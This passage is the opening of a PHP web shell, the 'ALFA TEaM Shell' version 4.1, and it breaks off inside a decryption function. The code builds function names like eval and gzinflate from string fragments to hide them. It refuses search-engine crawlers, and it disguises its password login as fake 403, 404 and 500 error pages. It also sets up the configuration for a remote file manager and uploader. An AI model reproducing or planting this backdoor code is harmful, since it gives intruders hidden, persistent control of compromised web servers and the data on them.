<?php
/*
	Author: 	Solevisible/Alfa-Team
	Telegram: 	https://telegram.me/solevisible1
	YouTube: 	https://youtube.com/solevisible
	Gmail:		solevisible@gmail.com
	Date:		Monday, September 14, 2020
*/
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'alfa',
    'password' => 'a6f452ec3293d7fb72c5b677257b20ec',//md5(ehsan)
    'safe_mode' => '0',
    'login_page' => '403',
    'show_icons' => '1',
    'post_encryption' => false,
    'cgi_api' => true,
);

$CWppUDJxuf = 'fu' . 'n' . 'ct' . 'ion_' . 'e' . 'xist' . 's';
$aztJtafUXm = 'cha' . 'r' . 'C' . 'o' . 'd' . 'e' . 'A' . 't' . '';
$OVpGNqqFZs = 'e' . 'v' . 'al';
$psDEwGhsxg = 'gz' . 'inf' . 'late';

if (!$CWppUDJxuf('b' . 'a' . 'se64' . '_en' . 'c' . 'ode' . ''))
{
    function vcnvSCZgBz($data)
    {
        if (empty($data)) return;
        $b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
        $o1 = $o2 = $o3 = $h1 = $h2 = $h3 = $h4 = $bits = $i = 0;
        $ac = 0;
        $enc = '';
        $tmp_arr = array();
        if (!$data)
        {
            return $data;
        }
        do
        {
            $o1 = $aztJtafUXm($data, $i++);
            $o2 = $aztJtafUXm($data, $i++);
            $o3 = $aztJtafUXm($data, $i++);
            $bits = $o1 << 16 | $o2 << 8 | $o3;
            $h1 = $bits >> 18 & 0x3f;
            $h2 = $bits >> 12 & 0x3f;
            $h3 = $bits >> 6 & 0x3f;
            $h4 = $bits & 0x3f;
            $tmp_arr[$ac++] = charAt($b64, $h1) . charAt($b64, $h2) . charAt($b64, $h3) . charAt($b64, $h4);
        }
        while ($i < strlen($data));
        $enc = implode($tmp_arr, '');
        $r = (strlen($data) % 3);
        return ($r ? substr($enc, 0, ($r - 3)) : $enc) . substr('===', ($r || 3));
    }
    function charCodeAt($data, $char)
    {
        return ord(substr($data, $char, 1));
    }
    function charAt($data, $char)
    {
        return substr($data, $char, 1);
    }
}
else
{
    function vcnvSCZgBz($s)
    {
        $b = 'b' . 'a' . 'se64' . '_en' . 'c' . 'ode' . '';
        return $b($s);
    }
}
if (!$CWppUDJxuf('b' . 'a' . 'se' . '6' . '4' . '_d' . 'ecod' . 'e' . ''))
{
    function zRtSHsbTzV($input)
    {
        if (empty($input)) return;
        $keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
        $chr1 = $chr2 = $chr3 = "";
        $enc1 = $enc2 = $enc3 = $enc4 = "";
        $i = 0;
        $output = "";
        $input = preg_replace("[^A-Za-z0-9\+\/\=]", "", $input);
        do
        {
            $enc1 = strpos($keyStr, substr($input, $i++, 1));
            $enc2 = strpos($keyStr, substr($input, $i++, 1));
            $enc3 = strpos($keyStr, substr($input, $i++, 1));
            $enc4 = strpos($keyStr, substr($input, $i++, 1));
            $chr1 = ($enc1 << 2) | ($enc2 >> 4);
            $chr2 = (($enc2 & 15) << 4) | ($enc3 >> 2);
            $chr3 = (($enc3 & 3) << 6) | $enc4;
            $output = $output . chr((int)$chr1);
            if ($enc3 != 64)
            {
                $output = $output . chr((int)$chr2);
            }
            if ($enc4 != 64)
            {
                $output = $output . chr((int)$chr3);
            }
            $chr1 = $chr2 = $chr3 = "";
            $enc1 = $enc2 = $enc3 = $enc4 = "";
        }
        while ($i < strlen($input));
        return $output;
    }
}
else
{
    function zRtSHsbTzV($s)
    {
        $b = 'b' . 'a' . 'se' . '6' . '4' . '_d' . 'ecod' . 'e' . '';
        return $b($s);
    }
}

function __ZW5jb2Rlcg($s)
{
    return vcnvSCZgBz($s);
}
function __ZGVjb2Rlcg($s)
{
    return zRtSHsbTzV($s);
}

$GLOBALS['DB_NAME'] = $GLOBALS['oZgNypoPRU'];

foreach ($GLOBALS['DB_NAME'] as $key => $value)
{
	$prefix = substr($key, 0, 2);
	if ($prefix == "us")
	{
		$GLOBALS['DB_NAME']["user"] = $value;
		$GLOBALS['DB_NAME']["user_rand"] = $key;
	}
	elseif ($prefix == "pa")
	{
		$GLOBALS['DB_NAME']["pass"] = $value;
		$GLOBALS['DB_NAME']["pass_rand"] = $key;
	}
	elseif ($prefix == "sa")
	{
		$GLOBALS['DB_NAME']["safemode"] = $value;
		$GLOBALS['DB_NAME']["safemode_rand"] = $key;
	}
	elseif ($prefix == "lo")
	{
		$GLOBALS['DB_NAME']["login_page"] = $value;
		$GLOBALS['DB_NAME']["login_page_rand"] = $key;
	}
	elseif ($prefix == "sh")
	{
		$GLOBALS['DB_NAME']["show_icons"] = $value;
		$GLOBALS['DB_NAME']["show_icons_rand"] = $key;
	}
	elseif ($prefix == "po")
	{
		$GLOBALS['DB_NAME']["post_encryption"] = $value;
		$GLOBALS['DB_NAME']["post_encryption_rand"] = $key;
	}
	elseif ($prefix == "cg")
	{
		$GLOBALS['DB_NAME']["cgi_api"] = $value;
		$GLOBALS['DB_NAME']["cgi_api_rand"] = $key;
	}
}

unset($GLOBALS['oZgNypoPRU']);

if (!isset($_SERVER["HTTP_HOST"])) exit();

if(!empty($_SERVER['HTTP_USER_AGENT'])){$userAgents = array("Google","Slurp","MSNBot","ia_archiver","Yandex","Rambler","bot","spider");if(preg_match('/'.implode('|',$userAgents).'/i',$_SERVER['HTTP_USER_AGENT'])){header('HTTP/1.0 404 Not Found');exit;}}
if(!isset($GLOBALS['DB_NAME']['user']))exit('$GLOBALS[\'DB_NAME\'][\'user\']');
if(!isset($GLOBALS['DB_NAME']['pass']))exit('$GLOBALS[\'DB_NAME\'][\'pass\']');
if(!isset($GLOBALS['DB_NAME']['safemode']))exit('$GLOBALS[\'DB_NAME\'][\'safemode\']');
if(!isset($GLOBALS['DB_NAME']['login_page']))exit('$GLOBALS[\'DB_NAME\'][\'login_page\']');
if(!isset($GLOBALS['DB_NAME']['show_icons']))exit('$GLOBALS[\'DB_NAME\'][\'show_icons\']');
if(!isset($GLOBALS['DB_NAME']['post_encryption']))exit('$GLOBALS[\'DB_NAME\'][\'post_encryption\']');
define("__ALFA_VERSION__", "4.1");
define("__ALFA_UPDATE__", "2");
define("__ALFA_CODE_NAME__", "Tesla");
define("__ALFA_DATA_FOLDER__", "ALFA_DATA");
define("__ALFA_POST_ENCRYPTION__", (isset($GLOBALS["DB_NAME"]["post_encryption"])&&$GLOBALS["DB_NAME"]["post_encryption"]==true?true:false));
define("__ALFA_SECRET_KEY__", __ALFA_POST_ENCRYPTION__?_AlfaSecretKey():'');
$GLOBALS['__ALFA_COLOR__'] = array(
		"shell_border" => array(
			"key_color" => "#0E304A",
			"multi_selector" => array(
				".header" => "border: 7px solid {color}",
				"#meunlist" => "border-color: {color}",
				"#hidden_sh" => "background-color: {color}",
				".ajaxarea" => "border: 1px solid {color}",
				".foot" => "border-color: {color}",
			)
		),
		"header_vars" => "#27979B",
		"header_values" => "#67ABDF",
		"header_on" => "#00FF00",
		"header_off" => "#ff0000",
		"header_none" => "#00FF00",
		"home_shell" => "#ff0000",
		"home_shell:hover" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".home_shell:hover" => "color: {color};",
			)
		),
		"back_shell" => "#efbe73",
		"back_shell:hover" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".back_shell:hover" => "color: {color};",
			)
		),
		"header_pwd" => "#00FF00",
		"header_pwd:hover" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".header_pwd:hover" => "color: {color};",
			)
		),
		"header_drive" => "#00FF00",
		"header_drive:hover" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".header_drive:hover" => "color: {color};",
			)
		),
		"header_show_all" => "#00FF00",
		"disable_functions" => "#ff0000",
		"footer_text" => "#27979B",
		"menu_options" => "#27979B",
		"menu_options:hover" => array(
			"key_color" => "#646464",
			"multi_selector" => array(
				".menu_options:hover" => "background-color: {color};font-weight: unset;",
			)
		),
		"options_list" => array(
			"key_color" => "#00FF00",
			"multi_selector" => array(
				".content_options_holder .header center a" => "color: {color};",
			)
		),
		"options_list:hover" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".content_options_holder .header center a:hover" => "color: {color};",
			)
		),
		"options_list_header" => array(
			"key_color" => "#59cc33",
			"multi_selector" => array(
				".txtfont_header" => "color: {color};",
			)
		),
		"options_list_text" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".txtfont,.tbltxt" => "color: {color};",
			)
		),
		"Alfa+" => array(
			"key_color" => "#06ff0f",
			"multi_selector" => array(
				".alfa_plus" => "color: {color};font-weight: unset;",
			)
		),
		"hidden_shell_text" => array(
			"key_color" => "#00FF00",
			"multi_selector" => array(
				"#hidden_sh a" => "color: {color};",
			)
		),
		"hidden_shell_version" => "#ff0000",
		"shell_name" => "#FF0000",
		"main_row:hover" => array(
			"key_color" => "#646464",
			"multi_selector" => array(
				".main tr:hover" => "background-color: {color};",
			)
		),
		"main_header" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".main th" => "color: {color};",
			)
		),
		"main_name" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".main .main_name" => "color: {color};font-weight: unset;",
			)
		),
		"main_size" => "#67ABDF",
		"main_modify" => "#67ABDF",
		"main_owner_group" => "#67ABDF",
		"main_green_perm" => "#25ff00",
		"main_red_perm" => "#FF0000",
		"main_white_perm" => "#FFFFFF",
		"beetween_perms" => "#FFFFFF",
		"main_actions" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".main .actions" => "color: {color};",
			)
		),
		"menu_options:hover" => array(
			"key_color" => "#646464",
			"multi_selector" => array(
				".menu_options:hover" => "background-color: {color};font-weight: unset;",
			)
		),
		"minimize_editor_background" => array(
			"key_color" => "#0e304a",
			"multi_selector" => array(
				".minimized-wrapper" => "background-color: {color};",
			)
		),
		"minimize_editor_text" => array(
			"key_color" => "#f5deb3",
			"multi_selector" => array(
				".minimized-text" => "color: {color};",
			)
		),
		"editor_border" => array(
			"key_color" => "#0e304a",
			"multi_selector" => array(
				".editor-explorer,.editor-modal" => "border: 2px solid {color};",
			)
		),
		"editor_background" => array(
			"key_color" => "rgba(0, 1, 23, 0.94)",
			"multi_selector" => array(
				".editor-explorer,.editor-modal" => "background-color: {color};",
			)
		),
		"editor_header_background" => array(
			"key_color" => "rgba(21, 66, 88, 0.93)",
			"multi_selector" => array(
				".editor-header" => "background-color: {color};",
			)
		),
		"editor_header_text" => array(
			"key_color" => "#00ff7f",
			"multi_selector" => array(
				".editor-path" => "color: {color};",
			)
		),
		"editor_header_button" => array(
			"key_color" => "#1d5673",
			"multi_selector" => array(
				".close-button, .editor-minimize" => "background-color: {color};",
			)
		),
		"editor_actions" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".editor_actions" => "color: {color};",
			)
		),
		"editor_file_info_vars" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".editor_file_info_vars" => "color: {color};",
			)
		),
		"editor_file_info_values" => array(
			"key_color" => "#67ABDF",
			"multi_selector" => array(
				".filestools" => "color: {color};",
			)
		),
		"editor_history_header" => array(
			"key_color" => "#14ff07",
			"multi_selector" => array(
				".hheader-text,.history-clear" => "color: {color};",
			)
		),
		"editor_history_list" => array(
			"key_color" => "#03b3a3",
			"multi_selector" => array(
				".editor-file-name" => "color: {color};",
			)
		),
		"editor_history_selected_file" => array(
			"key_color" => "rgba(49, 55, 93, 0.77)",
			"multi_selector" => array(
				".is_active" => "background-color: {color};",
			)
		),
		"editor_history_file:hover" => array(
			"key_color" => "#646464",
			"multi_selector" => array(
				".file-holder > .history:hover" => "background-color: {color};",
			)
		),
		"input_box_border" => array(
			"key_color" => "#0E304A",
			"multi_selector" => array(
				"input[type=text],textarea" => "border: 1px solid {color}",
			)
		),
		"input_box_text" => array(
			"key_color" => "#999999",
			"multi_selector" => array(
				"input[type=text],textarea" => "color: {color};",
			)
		),
		"input_box:hover" => array(
			"key_color" => "#27979B",
			"multi_selector" => array(
				"input[type=text]:hover,textarea:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
			)
		),
		"select_box_border" => array(
			"key_color" => "#0E304A",
			"multi_selector" => array(
				"select" => "border: 1px solid {color}",
			)
		),
		"select_box_text" => array(
			"key_color" => "#FFFFEE",
			"multi_selector" => array(
				"select" => "color: {color};",
			)
		),
		"select_box:hover" => array(
			"key_color" => "#27979B",
			"multi_selector" => array(
				"select:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
			)
		),
		"button_border" => array(
			"key_color" => "#27979B",
			"multi_selector" => array(
				"input[type=submit],.button,#addup" => "border: 1px solid {color};",
			)
		),
		"button:hover" => array(
			"key_color" => "#27979B",
			"multi_selector" => array(
				"input[type=submit]:hover" => "box-shadow:0 0 4px {color};border:2px solid {color};",
				".button:hover,#addup:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
			)
		),
		"outputs_text" => array(
			"key_color" => "#67ABDF",
			"multi_selector" => array(
				".ml1" => "color: {color};",
			)
		),
		"outputs_border" => array(
			"key_color" => "#0E304A",
			"multi_selector" => array(
				".ml1" => "border: 1px solid {color};",
			)
		),
		"uploader_border" => array(
			"key_color" => "#0E304A",
			"multi_selector" => array(
				".inputfile" => "box-shadow:0 0 4px {color};border:1px solid {color};",
			)
		),
		"uploader_background" => array(
			"key_color" => "#0E304A",
			"multi_selector" => array(
				".inputfile strong" => "background-color: {color};",
			)
		),
		"uploader_text_right" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".inputfile strong" => "color: {color};",
			)
		),
		"uploader_text_left" => array(
			"key_color" => "#25ff00",
			"multi_selector" => array(
				".inputfile span" => "color: {color};",
			)
		),
		"uploader:hover" => array(
			"key_color" => "#27979B",
			"multi_selector" => array(
				".inputfile:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
			)
		),
		"uploader_progress_bar" => array(
			"key_color" => "#00ff00",
			"multi_selector" => array(
				".up_bar" => "background-color: {color};",
			)
		),
		"mysql_tables" => "#00FF00",
		"mysql_table_count" => "#67ABDF",
		"copyright" => "#dfff00",
		"scrollbar" => array(
			"key_color" => "#1e82b5",
			"multi_selector" => array(
				"*::-webkit-scrollbar-thumb" => "background-color: {color};",
			)
		),
		"scrollbar_background" => array(
			"key_color" => "#000115",
			"multi_selector" => array(
				"*::-webkit-scrollbar-track" => "background-color: {color};",
			)
		),
);
$GLOBALS['__file_path'] = str_replace('\\','/',trim(preg_replace('!\(\d+\)\s.*!', '', __FILE__)));
$config = array('AlfaUser' => $GLOBALS['DB_NAME']['user'],'AlfaPass' => $GLOBALS['DB_NAME']['pass'],'AlfaProtectShell' => $GLOBALS['DB_NAME']['safemode'],'AlfaLoginPage' => $GLOBALS['DB_NAME']['login_page']);
//@session_start();
@session_write_close();
@ignore_user_abort(true);
@set_time_limit(0);
@ini_set('memory_limit', '-1');
@ini_set("upload_max_filesize", "9999m");
if($config['AlfaProtectShell']){
$SERVER_SIG = (isset($_SERVER["SERVER_SIGNATURE"])?$_SERVER["SERVER_SIGNATURE"]:"");
$Eform='<form method="post"><input style="margin:0;background-color:#fff;border:1px solid #fff;" type="password" name="password"></form>';
if($config['AlfaLoginPage'] == 'gui'){
if(@$_COOKIE["AlfaUser"] != $config['AlfaUser'] && $_COOKIE["AlfaPass"] != md5($config['AlfaPass'])){
if(@$_POST["usrname"]==$config['AlfaUser'] && @md5($_POST["password"])==$config['AlfaPass']){
__alfa_set_cookie("AlfaUser", $config['AlfaUser']);
__alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
@header('location: '.$_SERVER["PHP_SELF"]);
}
echo '
<style>
body{background: black;}
#loginbox { font-size:11px; color:green; right:85px; width:1200px; height:200px; border-radius:5px; -moz-boder-radius:5px; position:fixed; top:250px; }
#loginbox td { border-radius:5px; font-size:11px; }
</style>
<title>~ ALFA TEaM Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</title><center>
<center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="http://solevisible.org/images/alfa-iran.png" /></center>
<div id=loginbox><p><font face="verdana,arial" size=-1>
<center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
<tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ ALFA TEaM Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</b></font></th></tr>
<tr><td bgcolor="black" style="padding:5">
<form method="post">
<input type="hidden" name="action" value="login">
<input type="hidden" name="hide" value="">
<center><table>
<tr><td><font color="green" face="verdana,arial" size=-1>Login:</font></td><td><input type="text" size="30" name="usrname" placeholder="username" onfocus="if (this.value == \'username\'){this.value = \'\';}"></td></tr>
<tr><td><font color="green" face="verdana,arial" size=-1>Password:</font></td><td><input type="password" size="30" name="password" placeholder="password" onfocus="if (this.value == \'password\') this.value = \'\';"></td></tr>
<tr><td><font face="verdana,arial" size=-1>&nbsp;</font></td><td><font face="verdana,arial" size=-1><input type="submit" value="Login"></font></td></tr></table>
</div><br /></center>';
exit;
}
}elseif($config['AlfaLoginPage']=='500'){
if(@$_COOKIE["AlfaPass"] != @md5($config['AlfaPass'])){
if(@md5($_POST["password"])==$config['AlfaPass']){
__alfa_set_cookie("AlfaUser", $config['AlfaUser']);
__alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
@header('location: '.$_SERVER["PHP_SELF"]);
}
echo '<html><head><title>500 Internal Server Error</title></head><body><h1>Internal Server Error</h1><p>The server encountered an internal error or misconfiguration and was unable to complete your request.</p><p>Please contact the server administrator, '.$_SERVER['SERVER_ADMIN'].' and inform them of the time the error occurred, and anything you might have done that may have caused the error.</p><p>More information about this error may be available in the server error log.</p><hr>'.$SERVER_SIG.'</body></html>'.$Eform;
exit;
}
}elseif($config['AlfaLoginPage']=='403'){
if(@$_COOKIE["AlfaPass"] != @md5($config['AlfaPass'])){
if(@md5($_POST["password"])==$config['AlfaPass']){
__alfa_set_cookie("AlfaUser", $config['AlfaUser']);
__alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
@header('location: '.$_SERVER["PHP_SELF"]);
}
echo "<html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You don't have permission to access ".$_SERVER['PHP_SELF']." on this server.</p><hr>".$SERVER_SIG."</body></html>".$Eform;
exit;
}
}elseif($config['AlfaLoginPage']=='404'){
if(@$_COOKIE["AlfaPass"] != @md5($config['AlfaPass'])){
if(@md5($_POST["password"])==$config['AlfaPass']){
__alfa_set_cookie("AlfaUser", $config['AlfaUser']);
__alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
@header('location: '.$_SERVER["PHP_SELF"]);
}
echo "<title>404 Not Found</title><h1>Not Found</h1><p>The requested URL ".$_SERVER['PHP_SELF']." was not found on this server.<br><br>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p><hr>".$SERVER_SIG."</body></html>".$Eform;
exit;
}
}
}
function decrypt_post($str){
	if(__ALFA_POST_ENCRYPTION__){
		$pwd = __ALFA_SECRET_KEY__;
		$pwd     = __ZW5jb2Rlcg($pwd);
		$str     = __ZGVjb2Rlcg($str);
		$enc_chr = "";
		$enc_str = "";
		$i       = 0;
		while ($i < strlen($str)) {
			for ($j = 0; $j < strlen($pwd); $j++) {
				$enc_chr = chr(ord($str[$i]) ^ ord($pwd[$j]));
				$enc_str .= $enc_chr;
				$i++;
				if ($i >= strlen($str))
					break;
			}
		}
		return __ZGVjb2Rlcg($enc_str);
	}else{
		return